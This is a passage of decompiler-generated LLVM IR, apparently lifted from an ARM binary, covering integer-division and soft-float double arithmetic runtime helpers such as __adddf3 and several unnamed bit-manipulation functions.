  %v1_12a48 = phi i32 [ %v1_12a08.v6_12a08.v6_12a10.v6_12a18, %bb84 ], [ %v1_129b4, %dec_label_pc_129f4 ]
  %v0_12a38 = phi i32 [ %v0_12a2c, %bb84 ], [ %v2_129f4, %dec_label_pc_129f4 ]
  %v5_12a3c = icmp slt i32 %v0_12a38, -2
  br i1 %v5_12a3c, label %dec_label_pc_12a5c, label %dec_label_pc_12a40

dec_label_pc_12a40:                               ; preds = %dec_label_pc_12a38
  %v8_12a38 = icmp eq i32 %v0_12a38, -2
  br i1 %v8_12a38, label %dec_label_pc_12a50, label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a40
  %v3_12a44 = icmp ult i32 %v1_12a48, %v0_12a4c
  br i1 %v3_12a44, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_12a44
  %v2_12a44 = sub i32 %v1_12a48, %v0_12a4c
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_12a44, %bb85
  %v0_12a5052 = phi i32 [ %v1_12a48, %dec_label_pc_12a44 ], [ %v2_12a44, %bb85 ]
  %v3_12a4c = udiv i32 %v0_12a4c, 2
  br label %dec_label_pc_12a50

dec_label_pc_12a50:                               ; preds = %dec_label_pc_12a40, %bb86
  %v0_12a58 = phi i32 [ %v0_12a4c, %dec_label_pc_12a40 ], [ %v3_12a4c, %bb86 ]
  %v1_12a54 = phi i32 [ %v1_12a48, %dec_label_pc_12a40 ], [ %v0_12a5052, %bb86 ]
  %v3_12a50 = icmp ult i32 %v1_12a54, %v0_12a58
  br i1 %v3_12a50, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_12a50
  %v2_12a50 = sub i32 %v1_12a54, %v0_12a58
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_12a50, %bb87
  %v0_12a5c55 = phi i32 [ %v1_12a54, %dec_label_pc_12a50 ], [ %v2_12a50, %bb87 ]
  %v3_12a58 = udiv i32 %v0_12a58, 2
  br label %dec_label_pc_12a5c

dec_label_pc_12a5c:                               ; preds = %dec_label_pc_12a38, %bb88
  %v2_12a60 = phi i32 [ %v0_12a4c, %dec_label_pc_12a38 ], [ %v3_12a58, %bb88 ]
  %v1_12a60 = phi i32 [ %v1_12a48, %dec_label_pc_12a38 ], [ %v0_12a5c55, %bb88 ]
  %v3_12a5c = icmp ult i32 %v1_12a60, %v2_12a60
  br i1 %v3_12a5c, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_12a5c
  %v2_12a5c = sub i32 %v1_12a60, %v2_12a60
  br label %bb76

dec_label_pc_12a68:                               ; preds = %entry
  %v0_12a68 = load i32, i32* @lr, align 4
  %v0_12a6c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_12a68)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_12a60, { 1, 2, 0 }
  uselistorder i32 %v0_12a4c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12a2c, { 1, 0, 2 }
  uselistorder i32 %v7_12a24, { 1, 0 }
  uselistorder i32 %v3_12a20, { 1, 0 }
  uselistorder i32 %v1_12a08.v6_12a08.v6_12a10.v6_12a18, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_12a14, { 1, 0 }
  uselistorder i32 %v4_12a0c, { 1, 0 }
  uselistorder i32 %v4_12a04, { 1, 0 }
  uselistorder i32 %v6_12a24, { 3, 0, 2, 1 }
  uselistorder i32 %v2_129f4, { 1, 0 }
  uselistorder i32 %v1_129e8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_129d4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_129e0.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_129b4, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32 -3, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 268435455, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_12a5c, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_12a50, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_129fc, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__aeabi_drsub(i32 %arg1, double %arg2) local_unnamed_addr {
entry:
  %v1_12a78 = sub i32 0, %arg1
  %v2_12a78 = sext i32 %v1_12a78 to i64
  %v3_12a7c = bitcast i64 %v2_12a78 to double
  %v9_12a7c = fadd double %v3_12a7c, %arg2
  %v10_12a7c = fptrunc double %v9_12a7c to float
  %v11_12a7c = bitcast float %v10_12a7c to i32
  ret i32 %v11_12a7c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12a80 = load i32, i32* @r0, align 4
  ret i32 %v2_12a80
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12a84 = load i32, i32* @r4, align 4
  store i32 %v3_12a84, i32* %stack_var_-12, align 4
  %v6_12a84 = load i32, i32* @r5, align 4
  %v0_12a88 = load i32, i32* %r0.global-to-local, align 4
  %v2_12a88 = mul i32 %v0_12a88, 2
  store i32 %v2_12a88, i32* %r4.global-to-local, align 4
  %v0_12a8c = load i32, i32* %r2.global-to-local, align 4
  %v2_12a8c = mul i32 %v0_12a8c, 2
  store i32 %v2_12a8c, i32* %r5.global-to-local, align 4
  %v4_12a90 = icmp eq i32 %v2_12a8c, %v2_12a88
  %v1_12a94 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v4_12a90, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_12a94 = load i32, i32* %r3.global-to-local, align 4
  %v5_12a94 = icmp eq i32 %v2_12a94, %v1_12a94
  br i1 %v5_12a94, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_12a98 = or i32 %v1_12a94, %v2_12a88
  %v5_12a98 = icmp eq i32 %v3_12a98, 0
  br i1 %v5_12a98, label %.thread3, label %bb11

bb11:                                             ; preds = %.thread
  %v2_12a9c = load i32, i32* %r3.global-to-local, align 4
  %v3_12a9c = or i32 %v2_12a9c, %v2_12a8c
  %v5_12a9c = icmp eq i32 %v3_12a9c, 0
  br i1 %v5_12a9c, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_12a88.off = add i32 %v2_12a88, 4194303
  %tmp = icmp ult i32 %v2_12a88.off, 2097152
  br i1 %tmp, label %.thread3, label %bb13

bb13:                                             ; preds = %bb12
  %v2_12a8c.off = add i32 %v2_12a8c, 4194303
  %tmp18 = icmp ult i32 %v2_12a8c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb11, %bb12, %bb13
  %v0_12aa8 = phi i1 [ true, %bb11 ], [ true, %bb12 ], [ %tmp18, %bb13 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_12aa8, i32 ptrtoint (i32* @global_var_12cc8.760 to i32))
  %v0_12aac = load i32, i32* %r4.global-to-local, align 4
  %v3_12aac = udiv i32 %v0_12aac, 2097152
  store i32 %v3_12aac, i32* %r4.global-to-local, align 4
  %v1_12ab0 = load i32, i32* %r5.global-to-local, align 4
  %v4_12ab0 = udiv i32 %v1_12ab0, 2097152
  %v5_12ab0 = sub nsw i32 %v4_12ab0, %v3_12aac
  %v5_12ab4 = icmp ult i32 %v4_12ab0, %v3_12aac
  br i1 %v5_12ab4, label %bb14, label %bb15

bb14:                                             ; preds = %.thread3
  %v7_12ab4 = sub nsw i32 0, %v5_12ab0
  br label %bb15

bb15:                                             ; preds = %.thread3, %bb14
  %storemerge = phi i32 [ %v7_12ab4, %bb14 ], [ %v5_12ab0, %.thread3 ]
  %v1_12b14 = phi i32 [ %v7_12ab4, %bb14 ], [ %v5_12ab0, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_12ab8 = icmp ugt i32 %v4_12ab0, %v3_12aac
  br i1 %v7_12ab8, label %dec_label_pc_12abc, label %dec_label_pc_12ad8

dec_label_pc_12abc:                               ; preds = %bb15
  %v2_12abc = add nsw i32 %v1_12b14, %v3_12aac
  store i32 %v2_12abc, i32* %r4.global-to-local, align 4
  %v0_12ac0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12ac0 = load i32, i32* %r3.global-to-local, align 4
  %v0_12ac4 = load i32, i32* %r0.global-to-local, align 4
  %v1_12ac4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_12ac0, i32* %r1.global-to-local, align 4
  store i32 %v1_12ac4, i32* %r0.global-to-local, align 4
  store i32 %v0_12ac0, i32* %r3.global-to-local, align 4
  store i32 %v0_12ac4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ad8

dec_label_pc_12ad8:                               ; preds = %bb15, %dec_label_pc_12abc
  %v0_12b14 = phi i32 [ %v3_12aac, %bb15 ], [ %v2_12abc, %dec_label_pc_12abc ]
  %tmp19 = icmp ugt i32 %v1_12b14, 54
  br i1 %tmp19, label %bb16, label %bb17

bb16:                                             ; preds = %dec_label_pc_12ad8
  %v6_12adc = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_12adc, i32* %r4.global-to-local, align 4
  store i32 %v6_12a84, i32* %r5.global-to-local, align 4
  %v15_12adc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v15_12adc

bb17:                                             ; preds = %dec_label_pc_12ad8
  %v0_12ae0 = load i32, i32* %r0.global-to-local, align 4
  %v3_12ae0 = icmp sgt i32 %v0_12ae0, -1
  %v4_12aec = urem i32 %v0_12ae0, 1048576
  %v5_12aec = or i32 %v4_12aec, 1048576
  store i32 %v5_12aec, i32* %r0.global-to-local, align 4
  br i1 %v3_12ae0, label %dec_label_pc_12afc, label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %bb17
  %v0_12af4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12af4 = sub i32 0, %v0_12af4
  store i32 %v1_12af4, i32* %r1.global-to-local, align 4
  %v2_12af4 = icmp eq i32 %v0_12af4, 0
  %v2_12af8 = icmp eq i1 %v2_12af4, false
  %v5_12af8 = sext i1 %v2_12af8 to i32
  %v6_12af8 = sub nsw i32 %v5_12af8, %v5_12aec
  store i32 %v6_12af8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12afc

dec_label_pc_12afc:                               ; preds = %bb17, %dec_label_pc_12af4
  %v0_12afc = load i32, i32* %r2.global-to-local, align 4
  %v3_12afc = icmp sgt i32 %v0_12afc, -1
  %v4_12b04 = urem i32 %v0_12afc, 1048576
  %v5_12b04 = or i32 %v4_12b04, 1048576
  store i32 %v5_12b04, i32* %r2.global-to-local, align 4
  br i1 %v3_12afc, label %dec_label_pc_12b14, label %dec_label_pc_12b0c

dec_label_pc_12b0c:                               ; preds = %dec_label_pc_12afc
  %v0_12b0c = load i32, i32* %r3.global-to-local, align 4
  %v1_12b0c = sub i32 0, %v0_12b0c
  store i32 %v1_12b0c, i32* %r3.global-to-local, align 4
  %v2_12b0c = icmp eq i32 %v0_12b0c, 0
  %v2_12b10 = icmp eq i1 %v2_12b0c, false
  %v5_12b10 = sext i1 %v2_12b10 to i32
  %v6_12b10 = sub nsw i32 %v5_12b10, %v5_12b04
  store i32 %v6_12b10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12b14

dec_label_pc_12b14:                               ; preds = %dec_label_pc_12afc, %dec_label_pc_12b0c
  %v4_12b14 = icmp eq i32 %v0_12b14, %v1_12b14
  call void @__pseudo_cond_branch(i1 %v4_12b14, i32 ptrtoint (i32* @global_var_12cb0.761 to i32))
  %v1_12b18 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_12b18

; uselistorder directives
  uselistorder i32 %v0_12afc, { 1, 0 }
  uselistorder i32 %v0_12ae0, { 1, 0 }
  uselistorder i32 %v4_12ab0, { 2, 1, 0 }
  uselistorder i32 %v3_12aac, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_12a94, { 1, 0 }
  uselistorder i32 %v2_12a8c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_12a88, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 7, 6, 8, 0, 1, 2 }
  uselistorder label %dec_label_pc_12b14, { 1, 0 }
  uselistorder label %dec_label_pc_12afc, { 1, 0 }
  uselistorder label %dec_label_pc_12ad8, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_12b1c() local_unnamed_addr {
dec_label_pc_12b1c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_12b1c = load i32, i32* @r4, align 4
  %v1_12b1c = add i32 %v0_12b1c, -1
  store i32 %v1_12b1c, i32* @r4, align 4
  %v0_12b20 = load i32, i32* @r5, align 4
  %v1_12b20 = sub i32 32, %v0_12b20
  %v5_12b24 = icmp sgt i32 %v0_12b20, 32
  br i1 %v5_12b24, label %dec_label_pc_12b40, label %dec_label_pc_12b28

dec_label_pc_12b28:                               ; preds = %dec_label_pc_12b1c
  %v0_12b28 = load i32, i32* @r3, align 4
  %v6_12b28 = shl i32 %v0_12b28, %v1_12b20
  store i32 %v6_12b28, i32* %ip.global-to-local, align 4
  %v0_12b2c = load i32, i32* @r1, align 4
  %v3_12b2c = add i32 %v0_12b20, -1
  %v4_12b2c = shl i32 1, %v3_12b2c
  %v7_12b2c = lshr i32 %v0_12b28, %v0_12b20
  %v8_12b2c = add i32 %v0_12b2c, %v7_12b2c
  %v9_12b2c = icmp ult i32 %v8_12b2c, %v0_12b2c
  %v0_12b30 = load i32, i32* @r0, align 4
  %v2_12b30 = zext i1 %v9_12b2c to i32
  %v3_12b30 = add i32 %v2_12b30, %v0_12b30
  %v1_12b34 = load i32, i32* @r2, align 4
  %v7_12b34 = shl i32 %v1_12b34, %v1_12b20
  %v8_12b34 = add i32 %v7_12b34, %v8_12b2c
  store i32 %v8_12b34, i32* %r1.global-to-local, align 4
  %v5_12b38 = and i32 %v1_12b34, %v4_12b2c
  %v6_12b38 = icmp ne i32 %v5_12b38, 0
  %v7_12b38 = ashr i32 %v1_12b34, %v0_12b20
  %v9_12b38 = add i32 %v3_12b30, %v7_12b38
  %v10_12b38 = zext i1 %v6_12b38 to i32
  %v11_12b38 = add i32 %v10_12b38, %v9_12b38
  br label %dec_label_pc_12b5c

dec_label_pc_12b40:                               ; preds = %dec_label_pc_12b1c
  %v1_12b40 = add i32 %v0_12b20, -32
  %v1_12b44 = add i32 %v1_12b20, 32
  %v0_12b4c = load i32, i32* @r2, align 4
  %v2_12b4c = add i32 %v1_12b20, 31
  %v3_12b4c = lshr i32 -2147483648, %v2_12b4c
  %v4_12b4c = and i32 %v0_12b4c, %v3_12b4c
  %v5_12b4c = icmp ne i32 %v4_12b4c, 0
  %v6_12b4c = shl i32 %v0_12b4c, %v1_12b44
  %v2_12b50 = or i32 %v6_12b4c, 2
  %v2_12b50.v6_12b4c = select i1 %v5_12b4c, i32 %v2_12b50, i32 %v6_12b4c
  store i32 %v2_12b50.v6_12b4c, i32* %ip.global-to-local, align 4
  %v0_12b54 = load i32, i32* @r1, align 4
  %v7_12b54 = ashr i32 %v0_12b4c, %v1_12b40
  %v8_12b54 = add i32 %v0_12b54, %v7_12b54
  store i32 %v8_12b54, i32* %r1.global-to-local, align 4
  %v0_12b58 = load i32, i32* @r0, align 4
  %v2_12b58 = and i32 %v0_12b4c, 1073741824
  %v3_12b58 = icmp ne i32 %v2_12b58, 0
  %v4_12b58 = ashr i32 %v0_12b4c, 31
  %v6_12b58 = add i32 %v0_12b58, %v4_12b58
  %v7_12b58 = zext i1 %v3_12b58 to i32
  %v8_12b58 = add i32 %v6_12b58, %v7_12b58
  br label %dec_label_pc_12b5c

dec_label_pc_12b5c:                               ; preds = %dec_label_pc_12b28, %dec_label_pc_12b40
  %storemerge = phi i32 [ %v11_12b38, %dec_label_pc_12b28 ], [ %v8_12b58, %dec_label_pc_12b40 ]
  %v0_12b5c = phi i32 [ %v11_12b38, %dec_label_pc_12b28 ], [ %v8_12b58, %dec_label_pc_12b40 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_12b5c = and i32 %v0_12b5c, -2147483648
  store i32 %v1_12b5c, i32* @r5, align 4
  %v1_12b60 = icmp sgt i32 %v0_12b5c, -1
  call void @__pseudo_cond_branch(i1 %v1_12b60, i32 ptrtoint (i32* @global_var_12b70.762 to i32))
  %v0_12b64 = load i32, i32* %ip.global-to-local, align 4
  %v1_12b64 = sub i32 0, %v0_12b64
  store i32 %v1_12b64, i32* %ip.global-to-local, align 4
  %v2_12b64 = icmp eq i32 %v0_12b64, 0
  %v0_12b68 = load i32, i32* %r1.global-to-local, align 4
  %v2_12b68 = icmp eq i1 %v2_12b64, false
  %v5_12b68 = sext i1 %v2_12b68 to i32
  %v6_12b68 = sub i32 %v5_12b68, %v0_12b68
  store i32 %v6_12b68, i32* @r1, align 4
  %v7_12b68 = zext i1 %v2_12b68 to i32
  %v8_12b68 = icmp ne i32 %v6_12b68, %v7_12b68
  %v9_12b68 = icmp ne i32 %v0_12b68, -1
  %v10_12b68 = or i1 %v9_12b68, %v8_12b68
  %v11_12b68 = icmp ne i32 %v0_12b68, 0
  %v12_12b68 = select i1 %v2_12b68, i1 %v10_12b68, i1 %v11_12b68
  %v0_12b6c = load i32, i32* %r0.global-to-local, align 4
  %v5_12b6c = sext i1 %v12_12b68 to i32
  %v6_12b6c = sub i32 %v5_12b6c, %v0_12b6c
  store i32 %v6_12b6c, i32* %r0.global-to-local, align 4
  ret i32 %v6_12b6c

; uselistorder directives
  uselistorder i1 %v2_12b68, { 1, 2, 0 }
  uselistorder i32 %v0_12b68, { 1, 2, 0 }
  uselistorder i32 %v8_12b58, { 1, 0 }
  uselistorder i32 %v0_12b4c, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_12b38, { 1, 0 }
  uselistorder i32 %v1_12b34, { 1, 0, 2 }
  uselistorder i32 %v0_12b2c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_12b5c, { 1, 0 }
}

define i32 @function_12b70(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12b70:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_12b74 = icmp ult i32 %arg1, 1048574
  br i1 %v3_12b74, label %dec_label_pc_12bb4, label %dec_label_pc_12b78

dec_label_pc_12b78:                               ; preds = %dec_label_pc_12b70
  %v3_12b7c = icmp ult i32 %arg1, 2097150
  br i1 %v3_12b7c, label %dec_label_pc_12b9c, label %dec_label_pc_12b80

dec_label_pc_12b80:                               ; preds = %dec_label_pc_12b78
  %v1_12b80 = urem i32 %arg1, 2
  %v2_12b80 = icmp ne i32 %v1_12b80, 0
  %v3_12b80 = udiv i32 %arg1, 2
  store i32 %v3_12b80, i32* %r0.global-to-local, align 4
  %v0_12b84 = load i32, i32* %r1.global-to-local, align 4
  %v3_12b84 = zext i1 %v2_12b80 to i32
  %v6_12b84 = zext i32 %v0_12b84 to i64
  %v7_12b84 = sub i32 33, %v0_12b84
  %v8_12b84 = zext i32 %v7_12b84 to i64
  %v9_12b84 = shl i64 %v6_12b84, %v8_12b84
  %v10_12b84 = sub i32 32, %v0_12b84
  %v11_12b84 = shl i32 %v3_12b84, %v10_12b84
  %v12_12b84 = zext i32 %v11_12b84 to i64
  %v14_12b84 = or i64 %v12_12b84, %v9_12b84
  %v15_12b84 = trunc i64 %v14_12b84 to i32
  %v16_12b84 = add i32 %v0_12b84, -1
  %v17_12b84 = shl i32 1, %v16_12b84
  %v18_12b84 = and i32 %v17_12b84, %v0_12b84
  %v19_12b84 = icmp ne i32 %v18_12b84, 0
  store i32 %v15_12b84, i32* %r1.global-to-local, align 4
  %v0_12b88 = load i32, i32* @ip, align 4
  %v3_12b88 = zext i1 %v19_12b84 to i32
  %v6_12b88 = zext i32 %v0_12b88 to i64
  %v7_12b88 = sub i32 33, %v0_12b88
  %v8_12b88 = zext i32 %v7_12b88 to i64
  %v9_12b88 = shl i64 %v6_12b88, %v8_12b88
  %v10_12b88 = sub i32 32, %v0_12b88
  %v11_12b88 = shl i32 %v3_12b88, %v10_12b88
  %v12_12b88 = zext i32 %v11_12b88 to i64
  %v14_12b88 = or i64 %v12_12b88, %v9_12b88
  %v15_12b88 = trunc i64 %v14_12b88 to i32
  store i32 %v15_12b88, i32* @ip, align 4
  %v0_12b8c = load i32, i32* @r4, align 4
  %v1_12b8c = add i32 %v0_12b8c, 1
  store i32 %v1_12b8c, i32* @r4, align 4
  %v3_12b90 = mul i32 %v1_12b8c, 2097152
  %v2_12b94 = icmp ugt i32 %v3_12b90, -4194305
  call void @__pseudo_cond_branch(i1 %v2_12b94, i32 ptrtoint (i32* @global_var_12d28.763 to i32))
  br label %dec_label_pc_12b9c

dec_label_pc_12b9c:                               ; preds = %dec_label_pc_12bb4, %dec_label_pc_12b78, %dec_label_pc_12b80
  %v0_12b9c = load i32, i32* @ip, align 4
  %v2_12b9c = icmp slt i32 %v0_12b9c, 0
  %v6_12b9c = icmp eq i32 %v0_12b9c, -2147483648
  %v1_12ba0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v6_12b9c, label %bb, label %dec_label_pc_12b9c._crit_edge

bb:                                               ; preds = %dec_label_pc_12b9c
  %v2_12ba0 = urem i32 %v1_12ba0, 2
  %v3_12ba0 = icmp ne i32 %v2_12ba0, 0
  br label %dec_label_pc_12b9c._crit_edge

dec_label_pc_12b9c._crit_edge:                    ; preds = %dec_label_pc_12b9c, %bb
  %v1_12ba4 = phi i1 [ %v3_12ba0, %bb ], [ %v2_12b9c, %dec_label_pc_12b9c ]
  %v2_12ba4 = zext i1 %v1_12ba4 to i32
  %v3_12ba4 = add i32 %v2_12ba4, %v1_12ba0
  store i32 %v3_12ba4, i32* %r1.global-to-local, align 4
  %v0_12ba8 = load i32, i32* %r0.global-to-local, align 4
  %v1_12ba8 = load i32, i32* @r4, align 4
  %v2_12ba8 = and i32 %v1_12ba8, 4096
  %v3_12ba8 = icmp ne i32 %v2_12ba8, 0
  %v4_12ba8 = mul i32 %v1_12ba8, 1048576
  %v6_12ba8 = add i32 %v4_12ba8, %v0_12ba8
  %v7_12ba8 = zext i1 %v3_12ba8 to i32
  %v8_12ba8 = add i32 %v7_12ba8, %v6_12ba8
  %v1_12bac = load i32, i32* @r5, align 4
  %v2_12bac = or i32 %v1_12bac, %v8_12ba8
  store i32 %v2_12bac, i32* %r0.global-to-local, align 4
  ret i32 %v2_12bac

dec_label_pc_12bb4:                               ; preds = %dec_label_pc_12b70
  %v0_12bb4 = load i32, i32* @ip, align 4
  %v1_12bb4 = icmp slt i32 %v0_12bb4, 0
  %v2_12bb4 = mul i32 %v0_12bb4, 2
  store i32 %v2_12bb4, i32* @ip, align 4
  %v0_12bb8 = load i32, i32* %r1.global-to-local, align 4
  %v3_12bb8 = mul i32 %v0_12bb8, 2
  %v4_12bb8 = zext i1 %v1_12bb4 to i32
  %v5_12bb8 = or i32 %v3_12bb8, %v4_12bb8
  store i32 %v5_12bb8, i32* %r1.global-to-local, align 4
  %v9_12bb8 = icmp ule i32 %v5_12bb8, %v0_12bb8
  %v10_12bb8 = icmp ult i32 %v3_12bb8, %v0_12bb8
  %v11_12bb8 = select i1 %v1_12bb4, i1 %v9_12bb8, i1 %v10_12bb8
  %v3_12bbc = mul i32 %arg1, 2
  %v4_12bbc = zext i1 %v11_12bb8 to i32
  %v5_12bbc = or i32 %v4_12bbc, %v3_12bbc
  store i32 %v5_12bbc, i32* %r0.global-to-local, align 4
  %v1_12bc0 = and i32 %v3_12bbc, 1048576
  %v2_12bc0 = icmp eq i32 %v1_12bc0, 0
  %v0_12bc4 = load i32, i32* @r4, align 4
  %v1_12bc4 = add i32 %v0_12bc4, -1
  store i32 %v1_12bc4, i32* @r4, align 4
  br i1 %v2_12bc0, label %bb7, label %dec_label_pc_12b9c

bb7:                                              ; preds = %dec_label_pc_12bb4
  ret i32 %v5_12bbc

; uselistorder directives
  uselistorder i32 %v0_12bb8, { 1, 2, 0 }
  uselistorder i1 %v1_12bb4, { 1, 0 }
  uselistorder i32 %v1_12ba0, { 1, 0 }
  uselistorder i32 %v0_12b9c, { 1, 0 }
  uselistorder i32 %v0_12b88, { 1, 0, 2 }
  uselistorder i32 %v0_12b84, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12b9c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12b9c, { 0, 2, 1 }
}

define i32 @function_12bcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12bcc:
  %v2_12bcc = icmp eq i32 %arg1, 0
  br i1 %v2_12bcc, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_12bcc
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_12bcc
  %v1_12bd810 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_12c34 = phi i32 [ %arg1, %bb ], [ %v1_12bd810, %bb35 ]
  %v1_12bec = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_12be4 = icmp ugt i32 %v0_12c34, 65535
  br i1 %v2_12be4, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_12be8 = and i32 %v0_12c34, 32768
  %v3_12be8 = icmp eq i32 %v2_12be8, 0
  %v4_12be8 = udiv i32 %v0_12c34, 65536
  br i1 %v3_12be8, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_12bec = add nsw i32 %v1_12bec, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_12bf8 = phi i32 [ %v1_12bec, %.thread ], [ %v1_12bec, %bb36 ], [ %v2_12bec, %bb37 ]
  %v1_12bf4 = phi i32 [ %v0_12c34, %.thread ], [ %v4_12be8, %bb36 ], [ %v4_12be8, %bb37 ]
  %v2_12bf0 = icmp ugt i32 %v1_12bf4, 255
  br i1 %v2_12bf0, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_12bf4 = and i32 %v1_12bf4, 128
  %v3_12bf4 = icmp eq i32 %v2_12bf4, 0
  %v4_12bf4 = udiv i32 %v1_12bf4, 256
  br i1 %v3_12bf4, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_12bf8 = add nsw i32 %v1_12bf8, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_12c04 = phi i32 [ %v1_12bf8, %.thread3 ], [ %v1_12bf8, %bb38 ], [ %v2_12bf8, %bb39 ]
  %v1_12c00 = phi i32 [ %v1_12bf4, %.thread3 ], [ %v4_12bf4, %bb38 ], [ %v4_12bf4, %bb39 ]
  %v2_12bfc = icmp ugt i32 %v1_12c00, 15
  br i1 %v2_12bfc, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_12c00 = and i32 %v1_12c00, 8
  %v3_12c00 = icmp eq i32 %v2_12c00, 0
  %v4_12c00 = udiv i32 %v1_12c00, 16
  br i1 %v3_12c00, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_12c04 = add nsw i32 %v1_12c04, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_12c0c = phi i32 [ %v1_12c04, %.thread4 ], [ %v1_12c04, %bb40 ], [ %v2_12c04, %bb41 ]
  %v1_12c14 = phi i32 [ %v1_12c00, %.thread4 ], [ %v4_12c00, %bb40 ], [ %v4_12c00, %bb41 ]
  %v2_12c08 = icmp ugt i32 %v1_12c14, 3
  br i1 %v2_12c08, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
